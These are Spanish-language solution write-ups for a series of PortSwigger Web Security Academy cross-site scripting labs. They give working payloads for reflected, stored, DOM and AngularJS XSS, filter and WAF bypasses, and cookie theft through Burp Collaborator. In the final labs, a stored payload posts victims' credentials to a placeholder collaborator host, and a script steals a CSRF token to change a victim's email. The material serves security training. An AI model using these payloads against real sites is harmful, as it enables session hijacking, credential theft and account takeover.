# Cross-site scripting

## Lab: Reflected XSS into HTML context with nothing encoded

### Enunciado

Este laboratorio contiene una vulnerabilidad sencilla de Cross-Site Scripting (XSS) reflejado en la funcionalidad de búsqueda. Para resolver el laboratorio, realiza un ataque de XSS que invoque la función **`alert`.**

### Resolución

Es un XSS reflejado por lo que viene de la solicitud de HTTP el ataque. Si ponemos en el buscador algo luego se refleja en la web por lo que realizamos este payload.

```
<SCRIPT>alert("XSS")</SCRIPT>"\>
```

<figure><img src="../../.gitbook/assets/image (1471).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1470).png" alt=""><figcaption></figcaption></figure>

## Lab: Stored XSS into HTML context with nothing encoded

### Enunciado

Este laboratorio contiene una vulnerabilidad de Cross-Site Scripting (XSS) almacenado en la funcionalidad de comentarios.

Para resolver el laboratorio, envía un comentario que invoque la función `alert` cuando se visualice la entrada del blog.

### Resolución

Vamos a escribir un comentario con el payload del anterior laboratorio.

<figure><img src="../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: DOM XSS in `document.write` sink using source `location.search`

### Enunciado

**Este laboratorio contiene una vulnerabilidad de Cross-Site Scripting (XSS) basada en el DOM en la funcionalidad de seguimiento de consultas de búsqueda.**

Utiliza la función **document.write** de JavaScript, que escribe datos en la página. La función **document.write** se llama con datos provenientes de **location.search**, los cuales puedes controlar mediante la URL del sitio web.

**Para resolver el laboratorio, realiza un ataque de XSS que invoque la función `alert`.**

### Resolución

Observamos que al buscar se refleja en la página pero no de la misma manera por lo que inspeccionamos a ver qué pasa.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Lo que hemos buscado se encuentra en el atributo **src** de una imagen por lo que realizamos el siguiente payload.

```
"><img src=x onerror=alert('BEAFN28')>
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: DOM XSS in `innerHTML` sink using source `location.search`

### Enunciado

**Este laboratorio contiene una vulnerabilidad de Cross-Site Scripting (XSS) basada en el DOM en la funcionalidad de búsqueda del blog.**

Utiliza una asignación a **innerHTML**, que modifica el contenido HTML de un elemento **div** usando datos provenientes de **location.search**.

**Para resolver el laboratorio, realiza un ataque de XSS que invoque la función `alert`.**

### Resolución

Lo primero es buscar algo y ver dónde y cómo se almacena.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se ve reflejado lo que buscamos en la web y se almacena en el **innerHTML** de la etiqueta **\<span>**. Sabiendo esto realizamos el siguiente payload.

```bash
</span><img src=/ onerror=alert(1) />//
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

### Enunciado

**Este laboratorio contiene una vulnerabilidad de Cross-Site Scripting (XSS) basada en el DOM en la página de envío de comentarios (**_**submit feedback**_**).**

Utiliza la función **$** de la biblioteca jQuery para encontrar un elemento de enlace (_anchor_) y cambia su atributo **href** usando datos provenientes de **location.search**.

**Para resolver el laboratorio, haz que el enlace de "back" (**_**volver**_**) ejecute `alert(document.cookie)`.**

### Resolución

Escribimos un feedback para ver dónde está la vulnerabilidad.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que por defecto nos añade el parámetro **returnPath** y añadimos cualquier valor.

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

No sucede nada pero si ponemos el ratón sobre **Back** se ha implementado en el atributo **href**. Sabiendo esto realizamos el siguiente payload.

```
javascript:alert(document.cookie)
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: DOM XSS in jQuery selector sink using a hashchange event

### Enunciado

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

### Resolución

Esta vez no tenemos ninguna barra de búsqueda ni nada por lo que revisamos el código fuente.

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Este código, en esencia, toma el valor que se encuentra después del símbolo **#** en la URL y lo utiliza para buscar ese término dentro de la página. Una vez que lo localiza, realiza un desplazamiento automático (scroll) hasta la sección donde se encuentra.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto realizamos este payload.

```
<iframe src="https://0aac008603b76d4880f22bb200c80064.web-security-academy.net/#" onload="this.src+='<img src=/ onerror=print()>'"></iframe>
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al pulsar el botón de **Deliver exploit to victim** completamos el laboratorio.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-29 103133.png" alt=""><figcaption></figcaption></figure>

## Lab: Reflected XSS into attribute with angle brackets HTML-encoded

### Enunciado

Este laboratorio contiene una vulnerabilidad de Cross-Site Scripting (XSS) reflejado en la funcionalidad de búsqueda del blog, donde los signos de mayor y menor (< y >) se codifican en HTML.

Para resolver el laboratorio, realiza un ataque de XSS que inyecte un atributo y llame a la función `alert`.

### Resolución

Comprobamos que se refleja en el navegador. Vemos el código fuente.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

No podemos hacer los payloads normales porque los signos > y < nos lo urlcodea por lo que realizamos que tras unas simples comillas en el código fuente se deja un espacio y en ese espacio aprovechamos para añadir un payload.

```
test" mirar código fuente espacio
test"onmouseover='alert(1)'
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded

### Enunciado

Este laboratorio contiene una vulnerabilidad de Cross-Site Scripting (XSS) almacenado en la funcionalidad de comentarios.

Para resolver el laboratorio, envía un comentario que invoque la función `alert` cuando se haga clic en el nombre del autor del comentario.

### Resolución

Vamos a escribir un comentario.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si pulsamos se nos redirige a la website que hemos puesto al escribir el comentario entonces ahí pondremos el payload.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ponemos el siguiente payload en el campo website.

```
javascript:alert(1)
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

### Enunciado

**Este laboratorio contiene una vulnerabilidad de Cross-Site Scripting (XSS) reflejado en la funcionalidad de seguimiento de consultas de búsqueda, donde los signos de mayor y menor (< y >) están codificados.** La reflexión del parámetro ocurre dentro de una **cadena de texto en JavaScript**. **Para resolver el laboratorio, realiza un ataque de XSS que salga de la cadena de JavaScript e invoque la función `alert`.**

### Resolución

Buscamos algo y vemos el código fuente.  &#x20;

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si ponemos una comilla simple después de algo nos da error pero no se ejecuta. Realizamos este payload.

```
'+alert(1)+'
';alert(1);'
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element

### Enunciado

**Este laboratorio contiene una vulnerabilidad de Cross-Site Scripting (XSS) basada en el DOM en la funcionalidad de verificación de stock.**

Utiliza la función **document.write** de JavaScript, que escribe datos en la página. La función **document.write** se llama con datos tomados de **location.search**, los cuales puedes controlar mediante la URL del sitio web.

Los datos se insertan dentro de un elemento **select**.

**Para resolver el laboratorio, realiza un ataque de XSS que salga del elemento select e invoque la función `alert`.**

### Resolución

Vemos el cód igo fuente del stock del producto.

<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

Viendo el código si añadimos en el enlace lo siguiente vemos que se almacena y se crea.

<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

Podemos modificar ese desplegable por lo que realizamos este payload.

```
</select><script>alert(1)</script>
```

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

### Enunciado

**Este laboratorio contiene una vulnerabilidad de Cross-Site Scripting (XSS) basada en el DOM en una expresión de AngularJS dentro de la funcionalidad de búsqueda.**

**AngularJS** es una biblioteca popular de JavaScript que analiza el contenido de los nodos HTML que contienen el atributo **ng-app** (también conocido como directiva de AngularJS).

Cuando se añade una directiva al código HTML, puedes ejecutar expresiones de JavaScript dentro de **dobles llaves** (`{{ }}`). Esta técnica resulta útil cuando los signos de mayor y menor (< y >) se codifican.

**Para resolver el laboratorio, realiza un ataque de XSS que ejecute una expresión de AngularJS e invoque la función `alert`.**

### Resolución

Buscamos algo y vemos el código fuente.

<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

En el **body** se define el atributo **ng-app**, que indica el elemento raíz de AngularJS y marca el inicio de la aplicación. Al establecerlo en el **body**, todo el contenido dentro de esa etiqueta será procesado como parte de la aplicación Angular, interpretando cualquier expresión de Angular que se incluya.

Gracias a la funcionalidad de búsqueda, podemos controlar un parámetro que se inserta dentro de esta sección gestionada por Angular.

Para explotar esto, utilizamos el payload:

```
{{constructor.constructor('alert(1)')()}}
```

* Los dobles corchetes `{{ }}` hacen que Angular evalúe la expresión.
* `constructor.constructor` permite crear y ejecutar código arbitrario, como si definiéramos una nueva función cuyo contenido será `alert(1)`.

<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Reflected DOM XSS

### Enunciado

**Este laboratorio demuestra una vulnerabilidad de tipo DOM XSS reflejado.**

Las vulnerabilidades DOM reflejadas ocurren cuando la aplicación del lado del servidor procesa datos de una solicitud y los devuelve en la respuesta. Luego, un script en la página maneja esos datos reflejados de forma insegura y los escribe en un _sink_ peligroso.

**Para resolver el laboratorio, crea una inyección que invoque la función `alert()`.**

### Resolución

Vemos las peticiones para analizarlas y vemos que la de búsqueda no tiene nada interesante pero la petición que se genera en el frontend sí.

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

Se nos devuelve la respuesta en formato JSON por lo que intentamos meter un alert.

<figure><img src="../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

No hay problema ya que se inyecta sin problema. Buscamos con el siguiente payload.

```
test\"-alert(1)}//
```

<figure><img src="../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Stored DOM XSS

### Enunciado

Este laboratorio demuestra una vulnerabilidad de tipo DOM XSS almacenado en la funcionalidad de comentarios del blog. Para resolver el laboratorio, explota esta vulnerabilidad para invocar la función `alert()`.

### Resolución

Escribimos un comentario para comprender el funcionamiento.

<figure><img src="../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

Se ha publicado sin problemas. Vemos el código fuente.

<figure><img src="../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

Aquí está el problema: se usa el método **replace**, que solo sustituye la **primera coincidencia**. Por ejemplo, si aplicamos `replace` para cambiar la **a** por **e** en "rascar", obtendremos "rescar".

Sabiendo esto, podemos diseñar un payload XSS típico, pero poniendo los signos **<>** al inicio, para que sean esos los que el script reemplace y no afecte al resto del código malicioso.

```
<><img src=x onerror=alert(1)> #en comentario
```

<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Reflected XSS into HTML context with most tags and attributes blocked

### Enunciado

**Este laboratorio contiene una vulnerabilidad de XSS reflejado (reflected XSS) en la funcionalidad de búsqueda**, pero utiliza un **firewall de aplicaciones web (WAF)** para protegerse contra vectores comunes de XSS. **Realizar un ataque de cross-site scripting que logre evadir el WAF y llame a la función `print()`.**

### Resolución

No nos deja aplicar las etiquetas que hemos usado comunes. Por lo que interceptamos la petición de búsqueda y la mandamos al Intruder. Vamos realizar un ataque de tipo Sniper por lo que copiamos los tags del cheatsheet en el payload.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Acepta la etiqueta **body**.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora vemos eventos existentes (copiados del cheatsheet) de esa etiqueta por lo que lo comprobamos en el **Intruder**.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Esos eventos son los que nos da código 200, tenemos que averiguar cuál de ellos nos viene bien para hacer la inyección. Usamos **onresize**.

```
<body onresize=print()>
<iframe src="https://0a9f00c7038cee398175256c005400dd.web-security-academy.net/?search=<body onresize=print()>" onload=this.style.width='100px'></iframe>
```

## Lab: Reflected XSS into HTML context with all tags blocked except custom ones

### Enunciado

Este laboratorio bloquea todas las etiquetas HTML excepto las personalizadas (custom tags). Realizar un ataque de cross-site scripting (XSS) que inyecte una etiqueta personalizada y que muestre automáticamente un `alert(document.cookie)`.

### Resolución

No nos sirve las etiquetas comunes.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Empleamos un servidor de explotación para generar un vector que incorpora una etiqueta personalizada con un identificador específico y un evento asociado que se dispara al recibir el foco. Al añadir un hashtag al final de la URL que hace referencia a esa etiqueta, el navegador, al cargar la página, intenta enfocarla automáticamente. Este comportamiento provoca la activación del evento malicioso sin requerir ninguna interacción por parte del usuario.

Ponemos en el body el siguiente payload.

```
<script> 
location='https://0a70006803e0cb33e9d1e11500ea0075.web-security-academy.net/?search=<etiqueta id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

Se lo enviamos a la víctima y completamos laboratorio.

## Lab: Reflected XSS with some SVG markup allowed

### Enunciado

Este laboratorio tiene una vulnerabilidad sencilla de XSS reflejado. El sitio bloquea etiquetas comunes pero omite algunas etiquetas y eventos de SVG. Para resolver el laboratorio, realiza un ataque de cross-site scripting que invoque la función `alert()`.

### Resolución

No nos sirve las etiquetas comunes ni nos deja crearlas customizadas. Interceptamos la petición para enviarlo al Intruder.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Encontramos estos tags vamos a ver información del primero.

{% embed url="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/animateTransform" %}

Para ver qué eventos realizamos también otra fuerza bruta.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto el payload sería el siguiente.

```
<svg><animateTransform onbegin=alert(0)>
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Reflected XSS in canonical link tag

### Enunciado

Este laboratorio refleja la entrada del usuario en una etiqueta `link` con el atributo `canonical` y escapa los signos de mayor y menor (< y >). Para resolver el laboratorio, realiza un ataque de cross-site scripting en la página principal que inyecte un atributo que invoque la función `alert()`. Para ayudarte con el exploit, puedes asumir que el usuario simulado presionará las siguientes combinaciones de teclas:

* ALT+SHIFT+X
* CTRL+ALT+X
* Alt+X

Ten en cuenta que la solución prevista para este laboratorio solo es posible en Chrome.

### Resolución

Miramos el código fuente.

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Aprovechamos este comportamiento para inyectar atributos como accesskey y onclick, vinculando la ejecución de código a una combinación de teclas. Al presionar, por ejemplo, Alt+Shift+X, el navegador dispara el evento y ejecuta la función. Aunque no se activa automáticamente al cargar la página, se considera válido porque no exige interacción directa con el contenido ni clics.

{% embed url="https://developer.mozilla.org/es/docs/Web/HTML/Reference/Global_attributes/accesskey" %}

```
?'accesskey='x'onclick='alert(1)
```

## Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

### Enunciado

Este laboratorio contiene una vulnerabilidad de cross-site scripting (XSS) reflejado en la funcionalidad de seguimiento de consultas de búsqueda. La reflexión ocurre dentro de una cadena de texto en JavaScript, donde las comillas simples y las barras invertidas están escapadas.

Para resolver el laboratorio, realiza un ataque de cross-site scripting que rompa la cadena de JavaScript y llame a la función `alert`.

### Resolución

Buscamos algo y vemos el código fuente.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

La variable **searchTerms** almacena el valor ingresado en la búsqueda. Luego, **document.write** inserta ese valor en el DOM dentro de una etiqueta `<img>`. Aunque se aplica **encodeURIComponent** para escapar caracteres en la URL, la inyección ocurre antes de esa codificación al romper el contexto del script con `</script>`, permitiendo ejecutar HTML arbitrario.

Para explotar esto, usamos un payload que cierra el `<script>` y añade código malicioso:

```
</script><img src=x onerror=alert(1)>
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

### Enunciado

Este laboratorio contiene una vulnerabilidad de **cross-site scripting (XSS) reflejado** en la funcionalidad de seguimiento de consultas de búsqueda, donde los **signos de mayor/menor (angle brackets) y las comillas dobles** están codificados en HTML y **las comillas simples están escapadas**.

Para resolver este laboratorio, realiza un ataque de XSS que **rompa la cadena de JavaScript** y llame a la función **alert**.

### Resolución

Miramos el código fuente para ver el resultado de la búsqueda.

<figure><img src="../../.gitbook/assets/image (1473).png" alt=""><figcaption></figcaption></figure>

Recordemos que no podemos usar comillas simples ni corchetes angulares. Realizamos el siguiente payload.

```
\'-alert(1)//
```

Funciona porque la barra invertida escapa la barra que usa el servidor para proteger la comilla simple, logrando cerrar la cadena en JavaScript. Después inyecta `alert(1)`, y `//` comenta el resto del código para evitar errores de sintaxis.

<figure><img src="../../.gitbook/assets/image (1474).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1475).png" alt=""><figcaption></figcaption></figure>

## Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

### Enunciado

Este laboratorio contiene una vulnerabilidad de cross-site scripting (XSS) almacenado en la funcionalidad de comentarios. Para resolver el laboratorio, envía un comentario que ejecute la función `alert` cuando se haga clic en el nombre del autor del comentario.

### Resolución

Dejamos un comentario para ver cómo funciona el servidor.

<figure><img src="../../.gitbook/assets/image (1476).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1477).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto realizamos este payload.

```
https://test.com?&apos;-alert(1)-&apos;
```

**Lo que hace:**

* Usamos `&apos;` para cerrar la comilla simple del atributo `href` del enlace.
* Inyecta `-alert(1)-` como código JavaScript malicioso.
* El navegador convierte `&apos;` en `'`, rompiendo el valor del `href`.

<figure><img src="../../.gitbook/assets/image (1478).png" alt=""><figcaption></figcaption></figure>

## Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

### Enunciado

Este laboratorio contiene una vulnerabilidad de **cross-site scripting reflejado** en la funcionalidad de búsqueda del blog. La reflexión ocurre dentro de un **template string** (cadena plantilla), donde los signos de mayor/menor (`<`, `>`), las comillas simples y dobles están codificadas en HTML, y las comillas invertidas (backticks) están escapadas. Para resolver este laboratorio, realiza un ataque de **cross-site scripting** que llame a la función **alert** dentro del **template string**.

### Resolución

Buscamos algo para ver el código fuente.

<figure><img src="../../.gitbook/assets/image (1479).png" alt=""><figcaption></figcaption></figure>

El código usa **template strings** (las comillas invertidas \`) en JavaScript, lo que permite interpolar variables o ejecutar expresiones con `${}`.

Como el valor que ingresamos se inserta sin filtrar en esa plantilla dentro de `<script>`, podemos inyectar algo como:

```
${alert(1)}
```

Esto ejecuta **alert(1)** porque la interpolación se evalúa como código JavaScript.

<figure><img src="../../.gitbook/assets/image (1480).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1481).png" alt=""><figcaption></figcaption></figure>

## Lab: Exploiting cross-site scripting to steal cookies

### Enunciado

Este laboratorio contiene una vulnerabilidad de **XSS almacenado** en la función de comentarios del blog. Un usuario víctima simulado verá todos los comentarios después de que se publiquen. Para resolver el laboratorio, explota la vulnerabilidad para **exfiltrar la cookie de sesión de la víctima** y luego **usa esta cookie para suplantarla**.

> Para evitar que la plataforma Academy se use para atacar sistemas externos arbitrarios, nuestro firewall bloquea las interacciones entre los laboratorios y sistemas externos. Para resolver el laboratorio, debes usar el **servidor público predeterminado de Burp Collaborator**. Algunos usuarios notarán que hay una solución alternativa para este laboratorio que no requiere Burp Collaborator. Sin embargo, es **mucho menos sutil** que exfiltrar la cookie.

### Resolución

Interceptamos la petición para mandarla al **Repeater**.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-02 220522 (2).png" alt=""><figcaption></figcaption></figure>

Copiamos el payload del Burp Collaborator y lo URLcodeamos.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-02 220756 (1).png" alt=""><figcaption></figcaption></figure>

Enviamos la petición. Ya hemos robado las cookies.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-02 220846 (1).png" alt=""><figcaption></figcaption></figure>

En la petición de login cambiamos la cookie con la que hemos robado y la enviamos.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-02 221229 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-02 221209 (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Exploiting cross-site scripting to capture passwords

### Enunciado

**Este laboratorio contiene una vulnerabilidad de XSS almacenado (stored XSS) en la función de comentarios del blog.**

Un usuario víctima simulado **visualiza todos los comentarios después de que se publican**.

**Para resolver el laboratorio**, explota la vulnerabilidad para **exfiltrar el nombre de usuario y la contraseña de la víctima**, y luego **utiliza esas credenciales para iniciar sesión en la cuenta de la víctima**.

> Para evitar que la plataforma Academy se utilice para atacar a terceros, nuestro firewall bloquea las interacciones entre los laboratorios y sistemas externos arbitrarios. Para resolver el laboratorio, **debes usar el servidor público predeterminado de Burp Collaborator**.

### Resolución

Cogemos las etiquetas de login para obtener el valor dentro de esos inputs con el payload siguiente. Lo siguiente lo ponemos en el apartado de Comment con el enlace del Collaborator.

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-04 095254.png" alt=""><figcaption></figcaption></figure>

Al subirlo le damos pull now en el apartado de Collaborator.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-04 095238.png" alt=""><figcaption></figcaption></figure>

Obtenemos las credenciales así que nos logueamos.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-04 095320.png" alt=""><figcaption></figcaption></figure>

## Lab: Exploiting XSS to bypass CSRF defenses

### Enunciado

**Este laboratorio contiene una vulnerabilidad de XSS almacenado (stored XSS) en la función de comentarios del blog. Para resolver el laboratorio**, explota la vulnerabilidad para **robar un token CSRF**, que luego podrás usar para **cambiar la dirección de correo electrónico de alguien que vea los comentarios de la publicación del blog**.

**Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:**

* **Usuario:** `wiener`
* **Contraseña:** `peter`

### Resolución

Nos logueamos y cambiamos el correo para ver la petición.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tiene un valor CSRF. Podemos simular esa petición con esos campos en Comment.

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('email=hola@gmail.com'+'&csrf='+token)
};
</script>
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
